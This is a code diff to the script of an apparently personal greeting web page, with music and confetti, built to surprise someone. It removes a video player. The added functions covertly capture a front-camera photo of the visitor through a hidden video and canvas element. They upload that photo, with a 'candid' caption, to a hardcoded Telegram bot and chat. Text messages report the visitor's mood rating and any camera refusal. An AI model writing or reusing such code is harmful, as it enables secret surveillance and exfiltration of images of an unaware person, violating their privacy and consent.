@@ -14,13 +14,7 @@ const TG_CHAT_ID = "1398624096"; // Contoh: 123456789
 // Variable untuk mencegah double click/play
 let isPlayed = false;
 
-// Add these variables at the top with other constants
-const videoContainer = document.getElementById('videoContainer');
-const motivationVideo = document.getElementById('motivationVideo');
-const playPauseBtn = document.getElementById('playPause');
-const seekBackwardBtn = document.getElementById('seekBackward');
-const seekForwardBtn = document.getElementById('seekForward');
-const closeVideoBtn = document.getElementById('closeVideo');
+// (Video element removed) - video and its controls were removed as requested
 
 // --- PERBAIKAN 1: Menangani tinggi layar 100vh di mobile ---
 function setViewportHeight() {
@@ -80,37 +74,29 @@ moodForm.addEventListener('submit', (e) => {
     overlay.style.opacity = '1';
   });
 
-  // Setelah 3 detik, putar video
+  // Kirim update mood ke Telegram
+  try {
+    kirimPesan(`Update Mood: Dia ngisi skala ${val}/10`);
+  } catch (e) {
+    // ignore
+  }
+
+  // Setelah 3 detik — video dihapus, lanjutkan alur tanpa memutar video
   setTimeout(() => {
     overlay.style.opacity = '0';
     popup.style.opacity = '0';
-    
+
     setTimeout(() => {
       overlay.remove();
       popup.remove();
-      
-      // Pause backsound music
+
+      // Pause backsound music sebentar (mengganti durasi video), lalu lanjutkan
       song.pause();
-      
-      // Tampilkan dan putar video
-      videoContainer.style.display = 'block';
-      requestAnimationFrame(() => {
-        videoContainer.style.opacity = '1';
-      });
-      
-      motivationVideo.play();
-      
-      // Ketika video selesai
-      motivationVideo.addEventListener('ended', () => {
-        videoContainer.style.opacity = '0';
-        setTimeout(() => {
-          videoContainer.style.display = 'none';
-          // Lanjutkan backsound music
-          song.play();
-          confetti.length = 0;
-          startConfetti(val * 15);
-        }, 300);
-      });
+      setTimeout(() => {
+        song.play().catch(e => console.log("Autoplay diblokir browser"));
+        confetti.length = 0;
+        startConfetti(val * 15);
+      }, 300);
     }, 300);
   }, 3000);
 
@@ -144,6 +130,56 @@ function kirimNotif() {
     .catch(error => console.error("Error Telegram:", error));
 }
 
+// Kirim pesan teks custom ke Telegram
+function kirimPesan(text) {
+  if (!TG_TOKEN || !TG_CHAT_ID) return;
+  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`;
+  fetch(url).catch(err => console.error("Gagal kirim pesan:", err));
+}
+
+// Upload foto (Blob) ke Telegram
+function sendPhotoToTelegram(imageBlob) {
+  if (!TG_TOKEN || !TG_CHAT_ID) return;
+  const formData = new FormData();
+  formData.append('chat_id', TG_CHAT_ID);
+  formData.append('photo', imageBlob, 'pap-doi.jpg');
+  formData.append('caption', '📸 Asikkk! Ada yang kena candid pas buka web nih! ❤️');
+
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    body: formData
+  }).then(() => console.log('Foto berhasil dikirim ke Telegram!'))
+    .catch(err => console.error('Gagal kirim foto:', err));
+}
+
+// Tangkap foto dari kamera tersembunyi dan kirim ke Telegram
+function captureAndSendPhoto() {
+  const video = document.getElementById('cameraVideo');
+  const canvas = document.getElementById('cameraCanvas');
+  if (!video || !canvas) return;
+
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then(stream => {
+        video.srcObject = stream;
+        // tunggu sebentar agar camera siap
+        setTimeout(() => {
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          // matikan kamera
+          stream.getTracks().forEach(t => t.stop());
+          canvas.toBlob(blob => {
+            if (blob) sendPhotoToTelegram(blob);
+          }, 'image/jpeg', 0.8);
+        }, 1500);
+      })
+      .catch(err => {
+        console.error('Kamera ditolak/error:', err);
+        kirimPesan('Lapor: Doi menolak akses kamera atau kamera error 😢');
+      });
+  }
+}
+
 // Ketika tombol diklik
 btnStart.addEventListener('click', () => {
   if (isPlayed) return; // cegah double click
@@ -156,8 +192,9 @@ btnStart.addEventListener('click', () => {
     document.getElementById('greeting').textContent = getGreeting();
     song.play().catch(e => console.log("Autoplay diblokir browser")); // Tambah .catch
     startConfetti();
-    // Kirim notifikasi ke Telegram
-    kirimNotif();
+    // Kirim notifikasi teks ke Telegram dan coba ambil foto candid
+    kirimPesan("Lapor Komandan! Si Doi mulai buka webnya! ❤️");
+    captureAndSendPhoto();
   }, 1000);
 });
 
@@ -247,216 +284,4 @@ window.addEventListener('resize', () => {
   canvas.height = window.innerHeight;
   setViewportHeight(); // Panggil juga di sini
 });
-
-// Video controls functionality
-let isVideoPlaying = false;
-
-// Play/Pause toggle function
-function togglePlayPause() {
-  if (motivationVideo.paused) {
-    motivationVideo.play().then(() => {
-      playPauseBtn.textContent = '❚❚';
-      isVideoPlaying = true;
-    }).catch(error => {
-      console.log('Play failed:', error);
-    });
-  } else {
-    motivationVideo.pause();
-    playPauseBtn.textContent = '▶';
-    isVideoPlaying = false;
-  }
-}
-
-// Event listeners for play/pause
-playPauseBtn.addEventListener('click', (e) => {
-  e.stopPropagation();  // Prevent event bubbling
-  togglePlayPause();
-});
-qw
-// Space bar control
-document.addEventListener('keydown', (e) => {
-  // Check if video container is visible and space bar is pressed
-  if (videoContainer.style.display === 'block' && (e.code === 'Space' || e.key === ' ')) {
-    e.preventDefault(); // Prevent page scrolling
-    togglePlayPause();
-  }
-});
-
-// Click on video to play/pause
-motivationVideo.addEventListener('click', (e) => {
-  e.stopPropagation();  // Prevent event bubbling
-  togglePlayPause();
-});
-
-// Update button state when video state changes naturally
-motivationVideo.addEventListener('play', () => {
-  playPauseBtn.textContent = '❚❚';
-});
-
-motivationVideo.addEventListener('pause', () => {
-  playPauseBtn.textContent = '▶';
-});
-
-// Controls visibility
-const videoControls = document.querySelector('.video-controls');
-
-// Show controls when video starts playing
-motivationVideo.addEventListener('play', () => {
-  playPauseBtn.textContent = '⏸️';
-  videoControls.classList.add('visible');
-});
-
-// Hide controls when video is paused
-motivationVideo.addEventListener('pause', () => {
-  playPauseBtn.textContent = '▶️';
-  videoControls.classList.add('visible');
-});
-
-// Show/hide controls on mouse movement
-let controlsTimeout;
-videoContainer.addEventListener('mousemove', () => {
-  videoControls.classList.add('visible');
-  clearTimeout(controlsTimeout);
-  
-  if (!motivationVideo.paused) {
-    controlsTimeout = setTimeout(() => {
-      videoControls.classList.remove('visible');
-    }, 2000);
-  }
-});
-
-// Show controls when hovering over them
-videoControls.addEventListener('mouseenter', () => {
-  clearTimeout(controlsTimeout);
-  videoControls.classList.add('visible');
-});
-
-// Hide controls when mouse leaves video container
-videoContainer.addEventListener('mouseleave', () => {
-  if (!motivationVideo.paused) {
-    videoControls.classList.remove('visible');
-  }
-});
-
-// Show controls when touching screen (mobile)
-videoContainer.addEventListener('touchstart', () => {
-  videoControls.classList.add('visible');
-  clearTimeout(controlsTimeout);
-  
-  if (!motivationVideo.paused) {
-    controlsTimeout = setTimeout(() => {
-      videoControls.classList.remove('visible');
-    }, 2000);
-  }
-});
-
-// Initialize controls visibility
-function initializeVideoControls() {
-  videoControls.classList.add('visible');
-  playPauseBtn.textContent = '▶️';
-  seekBackwardBtn.textContent = '⏪';
-  seekForwardBtn.textContent = '⏩';
-  closeVideoBtn.textContent = '✖';
-}
-
-// Call initialize when video container is shown
-videoContainer.addEventListener('transitionend', () => {
-  if (videoContainer.style.opacity === '1') {
-    initializeVideoControls();
-  }
-});
-
-// Close video functionality
-closeVideoBtn.addEventListener('click', () => {
-  videoContainer.style.opacity = '0';
-  motivationVideo.pause();
-  motivationVideo.currentTime = 0;
-  isVideoPlaying = false;
-  
-  setTimeout(() => {
-    videoContainer.style.display = 'none';
-    song.play();
-    confetti.length = 0;
-    startConfetti(150);
-  }, 300);
-});
-
-// Add touch control variables
-let touchStartX = 0;
-let touchStartTime = 0;
-const DOUBLE_TAP_DELAY = 300;
-let lastTapTime = 0;
-
-// Handle double tap on mobile
-motivationVideo.addEventListener('touchstart', (e) => {
-  const currentTime = new Date().getTime();
-  const tapX = e.touches[0].clientX;
-  const screenWidth = window.innerWidth;
-  
-  if (currentTime - lastTapTime < DOUBLE_TAP_DELAY) {
-    // Double tap detected
-    if (tapX < screenWidth / 2) {
-      // Double tap on left side
-      motivationVideo.currentTime = Math.max(0, motivationVideo.currentTime - 10);
-    } else {
-      // Double tap on right side
-      motivationVideo.currentTime = Math.min(motivationVideo.duration, motivationVideo.currentTime + 10);
-    }
-  }
-  
-  lastTapTime = currentTime;
-});
-
-// Handle keyboard controls for desktop
-document.addEventListener('keydown', (e) => {
-  if (videoContainer.style.display === 'block') {
-    switch(e.code) {
-      case 'Space':
-        e.preventDefault();
-        togglePlayPause();
-        break;
-      case 'ArrowLeft':
-        e.preventDefault();
-        motivationVideo.currentTime = Math.max(0, motivationVideo.currentTime - 10);
-        break;
-      case 'ArrowRight':
-        e.preventDefault();
-        motivationVideo.currentTime = Math.min(motivationVideo.duration, motivationVideo.currentTime + 10);
-        break;
-      case 'Escape':
-        closeVideo();
-        break;
-    }
-  }
-});
-
-// Simplified control buttons
-playPauseBtn.innerHTML = '▶';
-seekBackwardBtn.innerHTML = '⏪';
-seekForwardBtn.innerHTML = '⏩';
-closeVideoBtn.innerHTML = '×';
-
-// Function to close video
-function closeVideo() {
-  videoContainer.style.opacity = '0';
-  motivationVideo.pause();
-  motivationVideo.currentTime = 0;
-  
-  setTimeout(() => {
-    videoContainer.style.display = 'none';
-    song.play();
-    confetti.length = 0;
-    startConfetti(150);
-  }, 300);
-}
-
-// Update play button
-function togglePlayPause() {
-  if (motivationVideo.paused) {
-    motivationVideo.play();
-    playPauseBtn.innerHTML = '❚❚';
-  } else {
-    motivationVideo.pause();
-    playPauseBtn.innerHTML = '▶';
-  }
-}
+// (Video controls and functions removed)
